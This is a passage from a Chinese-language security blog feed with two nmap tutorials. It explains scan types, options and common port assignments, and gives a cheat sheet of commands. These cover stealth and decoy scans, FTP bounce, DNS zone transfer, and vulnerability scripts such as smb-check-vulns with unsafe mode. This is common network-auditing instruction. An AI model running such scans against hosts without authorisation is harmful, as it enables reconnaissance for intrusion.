发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表。</p><pre><code>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</code></pre><p>扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。</p><pre><code>host -l | cut -d -f 4 | nmap -v -iL -</code></pre><p>进行DNS区域传输，以发现中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux – 其它系统进行区域传输时有不同的命令。<br>其他选项：</p><pre><code>-p (只扫描指定的端口)</code></pre><p>单个端口和用连字符表示的端口范 围(如 1-1023)都可以。当既扫描TCP端口又扫描UDP端口时，可以通过在端口号前加上T: 或者U:指定协议。 协议限定符一直有效直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。</p><pre><code>-F (快速 (有限的端口) 扫描)</code></pre><blockquote><p>nmap常用的端口扫描方式</p></blockquote><p>⑴ TCP同步（SYN）端口扫描（-sS参数）。</p><p>它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。 SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。 它也不像Fin/Null/Xmas，Maimon和Idle扫描依赖于特定平台，而可以应对任何兼容的 TCP协议栈。 它还可以明确可靠地区分open(开放的)， closed(关闭的)，和filtered(被过滤的) 状态<br>它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。如果收到ICMP不可到达错误 (类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</p><p>⑵ TCP connect()端口扫描（-sT参数）。</p><p>当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描。 当用户没有权限发送原始报文或者扫描IPv6网络时，就是这种情况。 Instead of writing raw packets as most other scan types do，Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。 这是和Web浏览器，P2P客户端以及大多数其它网络应用程序用以建立连接一样的 高层系统调用。它是叫做Berkeley Sockets API编程接口的一部分。Nmap用 该API获得每个连接尝试的状态信息，而不是读取响应的原始报文。</p><p>⑶ UDP端口扫描（-sU参数）。</p><p>很多流行的服务运行在TCP 协议上，UDP服务也不少。 DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)是最常见的三个。 因为UDP扫描一般较慢，比TCP更困难，一些安全审核人员忽略这些端口。<br>它可以和TCP扫描如 SYN扫描 (-sS)结合使用来同时检查两种协议。</p><p>⑷ Ping扫描（-sP参数）。</p><p>扫描所在网段上有哪些主机是存活的</p><blockquote><p>扫描指令</p></blockquote><p>类型</p><pre><code>nmap -sT TCP扫描  全链接扫描nmap -sS SYN扫描  半链接扫描nmap -sF FIN扫描  秘密扫描 除SYN、ACK其它位置1nmap -sX Xmas扫描  秘密扫描 FIN、URG、PUSH位置1nmap -sN Null扫描 秘密扫描 标志位全为0，发送TCP分组nmap -sP ping扫描 同时使用ICMP和TCP ACK 80，返回RST说明主机运行(外网)nmap -sU UDP扫描  发送0字节UDP包，快速扫描Windows的UDP端口nmap -sA ACK扫描  TCP ACK扫描，当防火墙开启时，查看防火墙有未过虑某端口nmap -sW 滑动窗口扫描 nmap -sR RPC扫描nmap -b  FTP反弹攻击(FTP Bounce attack) 外网用户通过FTP渗透内网</code></pre><p>选项</p><pre><code>nmap -P0 Nmap扫描前不Ping目标主机nmap -PT Nmap扫描前使用TCP ACK包确定主机是否在运行（-PT默认80）nmap -PS Nmap使用TCP SYN包进行扫描nmap -PI Nmap进行Ping扫描nmap -PB 结合-PT和-PI功能nmap -O  Nmap扫描TCP/IP指纹特征，确定目标主机系统类型nmap -I  反向标志扫描，扫描监听端口的用户nmap -f  分片发送SYN、FIN、Xmas、和Null扫描的数据包nmap -v  冗余模式扫描，可以得到扫描详细信息nmap -oN 扫描结果重定向到文件nmap -resume 使被中断的扫描可以继续nmap -iL -iL,扫描目录文件列表nmap -p  -p扫描端口列表,默认扫描1-1024端口和/usr/share/nmap/nmap-services文件中指定端口；   -p例：23；20-30,139,60000-nmap -F  快速扫描模式，只扫描nmap-services文件中的端口nmap -D  欺骗扫描，可有效隐藏扫描者IP地址nmap -S  在欺骗扫描时，用来指定源主机IPnmap -e  指定从哪个网卡发送和接收数据包nmap -g  指定扫描源端口nmap -r  按顺序扫描端口</code></pre><h1 id="2-端口和端口扫描"><a href="#2-端口和端口扫描" class="headerlink" title="2.端口和端口扫描"></a>2.端口和端口扫描</h1><blockquote><p>端口</p></blockquote><p>硬件领域的端口又称接口，如：USB端口、串行端口等。软件领域的端口一般指网络中面向连接服务和无连接服务的通信协议端口，是一种抽象的软件结构，包括一些数据结构和I/O（基本输入输出）缓冲区。</p><p><em>TCP端口</em><br>TCP：Transmission Control Protocol传输控制协议，TCP是一种面向连接（连接导向）的、可靠的、基于字节流的传输层（Transport layer）通信协议，由IETF的RFC 793说明（specified）。在简化的计算机网络OSI模型中，它完成第四层传输层所指定的功能，UDP是同一层内另一个重要的传输协议。</p><p><em>UDP端口</em><br>UDP：User Datagram Protocol用户数据报协议，UDP是OSI参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。UDP 协议基本上是IP协议与上层协议的接口。UDP协议适用端口分别运行在同一台设备上的多个应用程序。</p><blockquote><p>端口扫描</p></blockquote><p>端口扫描，顾名思义，就是逐个对一段端口或指定的端口进行扫描。通过扫描结果可以知道一台计算机上都提供了哪些服务，然后就可以通过所提供的这些服务的己知漏洞就可进行攻击。其原理是当一个主机向远端一个服务器的某一个端口提出建立一个连接的请求，如果对方有此项服务，就会应答，如果对方未安装此项服务时，即使你向相应的端口发出请求，对方仍无应答，利用这个原理，如果对所有熟知端口或自己选定的某个范围内的熟知端口分别建立连接，并记录下远端服务器所给予的应答，通过查看一记录就可以知道目标服务器上都安装了哪些服务，这就是端口扫描，通过端口扫描，就可以搜集到很多关于目标主机的各种很有参考价值的信息。例如，对方是否提供FPT服务、WWW服务或其它服务。</p><blockquote><p>常用端口号及其对应服务</p></blockquote><p><strong>windows中</strong><br>21端口：21端口主要用于ftp（file transfer protocol，文件传输协议）服务。<br>23端口：23端口主要用于telnet（远程登录）服务，是internet上普遍采用的登录和仿真程序。<br> 25端口：25端口为smtp（simple mail transfer protocol，简单邮件传输协议）服务器所开放，主要用于发送邮件，如今绝大多数邮件服务器都使用该协议。<br>53端口：53端口为dns（domain name server，域名服务器）服务器所开放，主要用于域名解析，dns服务在nt系统中使用的最为广泛。<br>67、68端口：67、68端口分别是为bootp服务的bootstrap protocol server（引导程序协议服务端）和bootstrap protocol client（引导程序协议客户端）开放的端口。<br>69端口：tftp是cisco公司开发的一个简单文件传输协议，类似于ftp。 79端口：79端口是为finger服务开放的，主要用于查询远程主机在线用户、操作系统类型以及是否缓冲区溢出等用户的详细信息。<br>80端口：80端口是为http（hypertext transport protocol，超文本传输协议）开放的，这是上网冲浪使用最多的协议，主要用于在www（world wide web，万维网）服务上传输信息的协议。<br>109、110端口：109端口是为pop2（post office protocol version 2，邮局协议2）服务开放的，110端口是为pop3（邮件协议3）服务开放的，pop2、pop3都是主要用于接收邮件的。<br>111端口：111端口是sun公司的rpc（remote procedure call，远程过程调用）服务所开放的端口，主要用于分布式系统中不同计算机的内部进程通信，rpc在多种网络服务中都是很重要的组件。<br>113端口：113端口主要用于windows的“authentication service”（验证服务）。<br> 119端口：119端口是为“network news transfer protocol”（网络新闻组传输协议，简称nntp）开放的。<br>135端口：135端口主要用于使用rpc（remote procedure call，远程过程调用）协议并提供dcom（分布式组件对象模型）服务。<br> 137端口：137端口主要用于“netbios name service”（netbios名称服务）。<br>139端口：139端口是为“netbios session service”提供的，主要用于提供windows文件和打印机共享以及unix中的samba服务。<br> 143端口：143端口主要是用于“internet message access protocol”v2（internet消息访问协议，简称imap）。<br> 161端口：161端口是用于“simple network management protocol”（简单网络管理协议，简称snmp）。<br> 443端口：43端口即网页浏览端口，主要是用于https服务，是提供加密和通过安全端口传输的另一种http。<br> 554端口：554端口默认情况下用于“real time streaming protocol”（实时流协议，简称rtsp）。<br>1080端口：1080端口是socks代理服务使用的端口，大家平时上网使用的www服务使用的是http协议的代理服务。<br> 1755端口：1755端口默认情况下用于“microsoft media server”（微软媒体服务器，简称mms）。<br> 4000端口：4000端口是用于大家经常使用的 聊天工具的，再细说就是为 客户端开放的端口， 服务端使用的端口是8000。<br> 5554端口：在今年4月30日就报道出现了一种针对微软lsass服务的新蠕虫病毒——震荡波（worm.sasser），该病毒可以利用tcp 5554端口开启一个ftp服务，主要被用于病毒的传播。<br> 5632端口：5632端口是被大家所熟悉的远程控制软件pcanywhere所开启的端口。<br> 8080端口：8080端口同80端口，是被用于www代理服务的，可以实现网页端口概念 在网络技术中，端口（port）大致有两种意思：一是物理意义上的端口，比如，adsl modem、集线器、交换机、路由器用于连接其他网络设备的接口，如rj-45端口、sc端口等等。二是逻辑意义上的端口，一般是指tcp/ip协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于ftp服务的21端口等等。 们这里将要介绍的就是逻辑意义上的端口。</p><p><strong>Linux中</strong></p><p>1 tcpmux TCP 端口服务多路复用<br>5 rje 远程作业入口<br>7 echo Echo 服务<br>9 discard 用于连接测试的空服务<br>11 systat 用于列举连接了的端口的系统状态<br>13 daytime 给请求主机发送日期和时间<br>17 qotd 给连接了的主机发送每日格言<br>18 msp 消息发送协议<br>19 chargen 字符生成服务；发送无止境的字符流<br>20 ftp-data FTP 数据端口<br>21 ftp 文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用<br>22 ssh 安全 Shell（SSH）服务<br>23 telnet Telnet 服务<br>25 smtp 简单邮件传输协议（SMTP）<br>37 time 时间协议<br>39 rlp 资源定位协议<br>42 nameserver 互联网名称服务<br>43 nicname WHOIS 目录服务<br>49 tacacs 用于基于 TCP/IP 验证和访问的终端访问控制器访问控制系统<br>50 re-mail-ck 远程邮件检查协议<br>53 domain 域名服务（如 BIND）<br>63 whois++ WHOIS++，被扩展了的 WHOIS 服务<br>67 bootps 引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用<br>68 bootpc Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用<br>69 tftp 小文件传输协议（TFTP）<br>70 gopher Gopher 互联网文档搜寻和检索<br>71 netrjs-1 远程作业服务<br>72 netrjs-2 远程作业服务<br>73 netrjs-3 远程作业服务<br>73 netrjs-4 远程作业服务<br>79 finger 用于用户联系信息的 Finger 服务<br>80 http 用于万维网（WWW）服务的超文本传输协议（HTTP）<br>88 kerberos Kerberos 网络验证系统<br>95 supdup Telnet 协议扩展<br>101 hostname SRI-NIC 机器上的主机名服务<br>102 iso-tsap ISO 开发环境（ISODE）网络应用<br>105 csnet-ns 邮箱名称服务器；也被 CSO 名称服务器使用<br>107 rtelnet 远程 Telnet<br>109 pop2 邮局协议版本2<br>110 pop3 邮局协议版本3<br>111 sunrpc 用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用<br>113 auth 验证和身份识别协议<br>115 sftp 安全文件传输协议（SFTP）服务<br>117 uucp-path Unix 到 Unix 复制协议（UUCP）路径服务<br>119 nntp 用于 USENET 讨论系统的网络新闻传输协议（NNTP）<br>123 ntp 网络时间协议（NTP）<br>137 netbios-ns 在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务<br>138 netbios-dgm 在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务<br>139 netbios-ssn 在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务<br>143 imap 互联网消息存取协议（IMAP）<br>161 snmp 简单网络管理协议（SNMP）<br>162 snmptrap SNMP 的陷阱<br>163 cmip-man 通用管理信息协议（CMIP）<br>164 cmip-agent 通用管理信息协议（CMIP）<br>174 mailq MAILQ<br>177 xdmcp X 显示管理器控制协议<br>178 nextstep NeXTStep 窗口服务器<br>179 bgp 边界网络协议<br>191 prospero Cliffod Neuman 的 Prospero 服务<br>194 irc 互联网中继聊天（IRC）<br>199 smux SNMP UNIX 多路复用<br>201 at-rtmp AppleTalk 选路<br>202 at-nbp AppleTalk 名称绑定<br>204 at-echo AppleTalk echo 服务<br>206 at-zis AppleTalk 区块信息<br>209 qmtp 快速邮件传输协议（QMTP）<br>210 z39.50 NISO Z39.50 数据库<br>213 ipx 互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议<br>220 imap3 互联网消息存取协议版本3<br>245 link LINK<br>347 fatserv Fatmen 服务器<br>363 rsvp_tunnel RSVP 隧道<br>369 rpc2portmap Coda 文件系统端口映射器<br>370 codaauth2 Coda 文件系统验证服务<br>372 ulistproc UNIX Listserv<br>389 ldap 轻型目录存取协议（LDAP）<br>427 svrloc 服务位置协议（SLP）<br>434 mobileip-agent 可移互联网协议（IP）代理<br>435 mobilip-mn 可移互联网协议（IP）管理器<br>443 https 安全超文本传输协议（HTTP）<br>444 snpp 小型网络分页协议<br>445 microsoft-ds 通过 TCP/IP 的服务器消息块（SMB）<br>464 kpasswd Kerberos 口令和钥匙改换服务<br>468 photuris Photuris 会话钥匙管理协议<br>487 saft 简单不对称文件传输（SAFT）协议<br>488 gss-http 用于 HTTP 的通用安全服务（GSS）<br>496 pim-rp-disc 用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC）<br>500 isakmp 互联网安全关联和钥匙管理协议（ISAKMP）<br>535 iiop 互联网内部对象请求代理协议（IIOP）<br>538 gdomap GNUstep 分布式对象映射器（GDOMAP）<br>546 dhcpv6-client 动态主机配置协议（DHCP）版本6客户<br>547 dhcpv6-server 动态主机配置协议（DHCP）版本6服务<br>554 rtsp 实时流播协议（RTSP）<br>563 nntps 通过安全套接字层的网络新闻传输协议（NNTPS）<br>565 whoami whoami<br>587 submission 邮件消息提交代理（MSA）<br>610 npmp-local 网络外设管理协议（NPMP）本地 / 分布式排队系统（DQS）<br>611 npmp-gui 网络外设管理协议（NPMP）GUI / 分布式排队系统（DQS）<br>612 hmmp-ind HMMP 指示 / DQS<br>631 ipp 互联网打印协议（IPP）<br>636 ldaps 通过安全套接字层的轻型目录访问协议（LDAPS）<br>674 acap 应用程序配置存取协议（ACAP）<br>694 ha-cluster 用于带有高可用性的群集的心跳服务<br>749 kerberos-adm Kerberos 版本5（v5）的“kadmin”数据库管理<br>750 kerberos-iv Kerberos 版本4（v4）服务<br>765 webster 网络词典<br>767 phonebook 网络电话簿<br>873 rsync rsync 文件传输服务 </p><blockquote><p>查看本机开放的端口</p></blockquote><p><strong>windows</strong><br>以管理员身份运行cmd，输入netstat -ano 即可看到所有连接的PID</p><p><strong>Linux</strong><br>使用nmap</p><pre><code>nmap 127.0.0.1</code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;#Linux环境下nmap的基本操作及端口扫描&lt;br&gt;##1.nmap基本操作&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;nmap简介&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NMap，也就是Network</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/"/>
    
    <category term="工具集" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="nmap" scheme="https://kabeor.github.io/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>Nmap速查手册</title>
    <link href="https://kabeor.github.io/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>https://kabeor.github.io/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
    <published>2018-03-10T16:00:00.000Z</published>
    <updated>2020-05-03T04:38:11.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0×01-nmap功能介绍"><a href="#0×01-nmap功能介绍" class="headerlink" title="0×01:nmap功能介绍"></a>0×01:nmap功能介绍</h1><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.主机存活检测</span><br><span class="line">2.端口探测</span><br><span class="line">3.服务识别</span><br><span class="line">4.操作系统识别</span><br><span class="line">5.硬件地址检测</span><br><span class="line">6.服务版本识别</span><br><span class="line">7.漏洞扫描,使用nmap自带脚本</span><br></pre></td></tr></table></figure></div><h1 id="0×02-简单示例"><a href="#0×02-简单示例" class="headerlink" title="0×02:简单示例"></a>0×02:简单示例</h1><hr><p>使用ping检测10.0.0.0/24这个网段</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -sP 10.0.0.0&#x2F;24</span><br></pre></td></tr></table></figure></div><p>使用SYN的方法对全端口进行扫描,在aggressive(4)的时间模板下,同时对开放的端口进行端口识别</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -p1-65535 -sV -sS -T4 target</span><br></pre></td></tr></table></figure></div><p>PS: -T代表的是扫描的时候,一些控制选项(TCP的延迟时间,探测报文之间的间隔等)的集合,具体的man nmap一下就知道了</p><p>使用SYN扫描,在aggressive(4)的时间模板下,探测操作系统的类型和版本,还有显示traceroute的结果,结果输出较为详细</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -v -sS -A -T4 target</span><br></pre></td></tr></table></figure></div><p>使用SYN扫描,在insane(5)的时间模板下,探测操作系统的类型和版本,还有显示traceroute的结果,结果输出较为详细</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -v -sS -A -T5 target</span><br></pre></td></tr></table></figure></div><p>使用SYN扫描,在insane(5)的时间模板下,探测操作系统的类型,还有显示traceroute的结果,操作系统的类型,结果输出较为详细</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -v -sV -O -sS -T5 target</span><br></pre></td></tr></table></figure></div><p>使用SYN的方法对全端口进行扫描,同时对开放的端口进行端口识别,在aggressive(4)的时间模板下,探测操作系统的类型还有显示traceroute的结果,结果输出较为详细</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -v -p 1-65535 -sV -O -sS -T4 target</span><br></pre></td></tr></table></figure></div><p>用SYN的方法对全端口进行扫描,同时对开放的端口进行端口识别,在insane(5)的时间模板下,探测操作系统的类型,还有显示traceroute的结果,结果输出较为详细</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -v -p 1-65535 -sV -O -sS -T5 target</span><br></pre></td></tr></table></figure></div><p>从文件中读取需要扫描的IP列表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -iL ip-address.txt</span><br></pre></td></tr></table></figure></div><h2 id="Nmap输出格式"><a href="#Nmap输出格式" class="headerlink" title="Nmap输出格式"></a>Nmap输出格式</h2><p>扫描的结果输出到屏幕,同时会存储一份到grep-output.txt</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div><p>扫描结果输出为html</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html</span><br></pre></td></tr></table></figure></div><h2 id="Nmap扫描Netbios"><a href="#Nmap扫描Netbios" class="headerlink" title="Nmap扫描Netbios"></a>Nmap扫描Netbios</h2><p>在子网中发现开放netbios的IP</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -sV -v -p139,445 10.0.0.1&#x2F;24</span><br></pre></td></tr></table></figure></div><p>扫描指定netbios的名称</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -sU --script nbstat.nse -p 137 target</span><br></pre></td></tr></table></figure></div><p>扫描指定的目标,同时检测相关漏洞</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap --script-args&#x3D;unsafe&#x3D;1 --script smb-check-vulns.nse -p 445 target</span><br></pre></td></tr></table></figure></div><p>将nmap的80端口的扫描结果,通过管道交给nikto进行扫描</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">Nmap Nikto Scan nmap -p80 10.0.1.0&#x2F;24 -oG - | nikto.pl -h -</span><br></pre></td></tr></table></figure></div><p>将nmap的80,443端口的扫描结果,通过管道交给nikto进行扫描</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -p80,443 10.0.1.0&#x2F;24 -oG - | nikto.pl -h -</span><br></pre></td></tr></table></figure></div><h1 id="0×03-Nmap参数详解"><a href="#0×03-Nmap参数详解" class="headerlink" title="0×03:Nmap参数详解"></a>0×03:Nmap参数详解</h1><hr><p>Nmap支持主机名,ip,网段的表示方式</p><p>例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段</span><br><span class="line">-iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描</span><br><span class="line">--exclude host1[, host2]        从扫描任务中需要排除的主机           </span><br><span class="line">--exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</span><br></pre></td></tr></table></figure></div><p>主机发现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br><span class="line">-Pn                     不检测主机存活</span><br><span class="line">-PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]  TCP SYN Ping&#x2F;TCP ACK Ping&#x2F;UDP Ping发现</span><br><span class="line">-PE&#x2F;PP&#x2F;PM               使用ICMP echo, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启   </span><br><span class="line">-n&#x2F;-R                   不对IP进行域名反向解析&#x2F;为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure></div><p>扫描技巧</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM                 TCP SYN&#x2F;TCP connect()&#x2F;ACK&#x2F;TCP窗口扫描&#x2F;TCP Maimon扫描</span><br><span class="line">-sU                             UDP扫描</span><br><span class="line">-sN&#x2F;sF&#x2F;sX                       TCP Null，FIN，and Xmas扫描</span><br><span class="line">--scanflags                     自定义TCP包中的flags</span><br><span class="line">-sI zombie host[:probeport]     Idlescan</span><br><span class="line">-sY&#x2F;sZ                          SCTP INIT&#x2F;COOKIE-ECHO 扫描</span><br><span class="line">-sO                             使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line">-b “FTP relay host”             使用FTP bounce scan</span><br></pre></td></tr></table></figure></div><p>指定端口和扫描顺序</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-p                      特定的端口 -p80,443 或者 -p1-65535</span><br><span class="line">-p U:PORT               扫描udp的某个端口, -p U:53</span><br><span class="line">-F                      快速扫描模式,比默认的扫描端口还少</span><br><span class="line">-r                      不随机扫描端口,默认是随机扫描的</span><br><span class="line">--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于&#x2F;usr&#x2F;share&#x2F;nmap.nmap默认扫前1000个</span><br><span class="line">--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</span><br></pre></td></tr></table></figure></div><p>服务版本识别</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</span><br><span class="line">--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</span><br><span class="line">--version-light                 打开轻量级模式,为--version-intensity 2的别名</span><br><span class="line">--version-all                   尝试所有探测,为--version-intensity 9的别名</span><br><span class="line">--version-trace                 显示出详细的版本侦测过程信息</span><br></pre></td></tr></table></figure></div><p>脚本扫描</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-sC                             根据端口识别的服务,调用默认脚本</span><br><span class="line">--script&#x3D;”Lua scripts”          调用的脚本名</span><br><span class="line">--script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     